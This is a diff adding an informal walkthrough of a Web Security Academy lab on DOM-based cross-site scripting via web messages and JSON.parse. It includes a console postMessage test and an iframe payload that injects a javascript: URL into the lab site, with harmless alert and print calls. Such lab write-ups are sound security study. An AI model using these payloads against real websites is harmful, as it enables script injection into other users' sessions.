@@ -41,3 +41,12 @@ If u find any of the above things in the source code of the website then there i
 
 ------------------------------------------------------------------------------------------------------------------------------
 
+#3 Lab: DOM XSS using web messages and JSON.parse
+
+    1.In console type window.postMessage('{"type":"load-channel","url":javascript:alert()"}'); and see the response in console.
+    It means that the website is accepting web messages and there is a possibility of DOM XSS
+    2.Go to exploit server and add the following payload,
+       <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+    and lab is solved.
+
+-------------------------------------------------------------------------------------------------------------------------------
